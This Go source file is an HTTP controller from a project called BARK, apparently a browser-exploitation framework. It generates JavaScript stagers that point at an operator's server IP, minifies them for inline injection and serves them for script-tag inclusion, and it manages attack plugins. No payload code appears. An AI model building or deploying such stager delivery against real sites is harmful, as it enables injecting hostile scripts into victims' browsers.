package controller

import (
	"net/http"
	"strconv"
	"time"

	"github.com/Et43/BARK/service"
	"github.com/gin-gonic/gin"
	log "github.com/sirupsen/logrus"
)

type StagerController interface {
	GetAvailablePlugins(c *gin.Context)
	GenerateStager(c *gin.Context)
	GetStagerFile(c *gin.Context)
	GetStagerForDelivery(c *gin.Context)
	CreatePlugin(c *gin.Context)
	UpdatePlugin(c *gin.Context)
	DeletePlugin(c *gin.Context)
	GetPluginTemplate(c *gin.Context)
}

type StagerControllerImpl struct {
	stagerService service.StagerService
}

// GetAvailablePlugins returns a list of all available plugins
func (s *StagerControllerImpl) GetAvailablePlugins(c *gin.Context) {
	plugins, err := s.stagerService.GetAvailablePlugins()
	if err != nil {
		log.Error("Failed to get available plugins: ", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to get available plugins"})
		return
	}

	c.JSON(http.StatusOK, gin.H{"plugins": plugins})
}

// GenerateStager creates a new stager with the specified configuration
func (s *StagerControllerImpl) GenerateStager(c *gin.Context) {
	var config service.StagerConfig
	if err := c.ShouldBindJSON(&config); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid configuration: " + err.Error()})
		return
	}

	// Validate required fields
	if config.ServerIP == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Server IP is required"})
		return
	}
	if config.ServerPort == "" {
		config.ServerPort = "8080" // Default port
	}

	// Generate the stager
	stager, err := s.stagerService.GenerateStager(config)
	if err != nil {
		log.Error("Failed to generate stager: ", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to generate stager"})
		return
	}

	// Generate filename based on timestamp
	timestamp := time.Now().Unix()
	filename := "stager_" + strconv.FormatInt(timestamp, 10) + ".js"

	// Save to file for hosting
	err = s.stagerService.SaveStagerToFile(stager, filename)
	if err != nil {
		log.Error("Failed to save stager file: ", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save stager file"})
		return
	}

	// Minify for inline injection
	minifiedStager, err := s.stagerService.MinifyStager(stager)
	if err != nil {
		log.Warn("Failed to minify stager: ", err)
		minifiedStager = stager // Use original if minification fails
	}

	c.JSON(http.StatusOK, gin.H{
		"success":         true,
		"filename":        filename,
		"stager_url":      "/stager/" + filename,
		"stager_source":   stager,
		"minified_source": minifiedStager,
		"config":          config,
	})
}

// GetStagerFile returns the content of a previously generated stager file
func (s *StagerControllerImpl) GetStagerFile(c *gin.Context) {
	filename := c.Param("filename")

	// Validate filename
	if filename == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Filename is required"})
		return
	}

	// Get file content
	content, err := s.stagerService.GetStagerFile(filename)
	if err != nil {
		log.Error("Failed to get stager file: ", err)
		c.JSON(http.StatusNotFound, gin.H{"error": "Stager file not found"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"filename": filename,
		"content":  content,
	})
}

// GetStagerForDelivery serves the stager file directly for script tag inclusion
func (s *StagerControllerImpl) GetStagerForDelivery(c *gin.Context) {
	filename := c.Param("filename")

	// Validate filename
	if filename == "" {
		c.String(http.StatusBadRequest, "// Error: Invalid filename")
		return
	}

	// Get file content
	content, err := s.stagerService.GetStagerFile(filename)
	if err != nil {
		log.Error("Failed to get stager file for delivery: ", err)
		c.String(http.StatusNotFound, "// Error: Stager file not found")
		return
	}

	// Serve as JavaScript content
	c.Header("Content-Type", "application/javascript")
	c.Header("Cache-Control", "no-cache, no-store, must-revalidate")
	c.Header("Pragma", "no-cache")
	c.Header("Expires", "0")
	c.String(http.StatusOK, content)
}

// CreatePlugin creates a new plugin
func (s *StagerControllerImpl) CreatePlugin(c *gin.Context) {
	var plugin service.Plugin
	if err := c.ShouldBindJSON(&plugin); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid plugin data: " + err.Error()})
		return
	}

	// Validate required fields
	if plugin.Name == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Plugin name is required"})
		return
	}
	if plugin.Content == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Plugin content is required"})
		return
	}

	err := s.stagerService.CreatePlugin(plugin)
	if err != nil {
		log.Error("Failed to create plugin: ", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusCreated, gin.H{
		"success": true,
		"message": "Plugin created successfully",
		"plugin":  plugin,
	})
}

// UpdatePlugin updates an existing plugin
func (s *StagerControllerImpl) UpdatePlugin(c *gin.Context) {
	pluginName := c.Param("name")
	if pluginName == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Plugin name is required"})
		return
	}

	var plugin service.Plugin
	if err := c.ShouldBindJSON(&plugin); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid plugin data: " + err.Error()})
		return
	}

	if plugin.Content == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Plugin content is required"})
		return
	}

	err := s.stagerService.UpdatePlugin(pluginName, plugin)
	if err != nil {
		log.Error("Failed to update plugin: ", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"message": "Plugin updated successfully",
		"plugin":  plugin,
	})
}

// DeletePlugin removes a plugin
func (s *StagerControllerImpl) DeletePlugin(c *gin.Context) {
	pluginName := c.Param("name")
	if pluginName == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Plugin name is required"})
		return
	}

	err := s.stagerService.DeletePlugin(pluginName)
	if err != nil {
		log.Error("Failed to delete plugin: ", err)
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"success": true,
		"message": "Plugin deleted successfully",
	})
}

// GetPluginTemplate returns a template for creating new plugins
func (s *StagerControllerImpl) GetPluginTemplate(c *gin.Context) {
	template := s.stagerService.GetPluginTemplate()
	c.JSON(http.StatusOK, gin.H{
		"template": template,
	})
}

func StagerControllerInit(stagerService service.StagerService) *StagerControllerImpl {
	return &StagerControllerImpl{
		stagerService: stagerService,
	}
}
